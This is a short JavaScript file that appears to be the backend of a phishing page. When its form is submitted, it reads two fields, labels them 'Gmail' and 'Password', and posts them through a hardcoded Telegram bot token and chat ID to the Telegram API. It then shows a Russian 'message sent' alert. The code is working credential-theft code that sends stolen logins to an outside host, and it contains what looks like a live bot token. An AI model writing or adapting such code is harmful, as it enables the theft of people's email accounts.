const TOKEN = '7885047021:AAG6h0cm_VRrvs3dzROMtYn9Hqi2e7qjxp4';
const CHAT_ID = '7200204699';
const URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

document.getElementById('telegramForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const messageInput = document.getElementById('message');
    const message = messageInput.value;

    const messageInput2 = document.getElementById('message2');
    const message2 = messageInput2.value;

    fetch(URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: `Gmail: ${message}\nPassword: ${message2}` 
        })
    })
    .then(response => {
        if (response.ok) {
            alert('Сообщение отправлено!');
            messageInput.value = '';
            messageInput2.value = '';
        } else {
            alert('Ошибка отправки сообщения.');
        }
    })
    .catch(error => {
        console.error('Ошибка:', error);
        alert('Ошибка отправки сообщения.');
    });
});
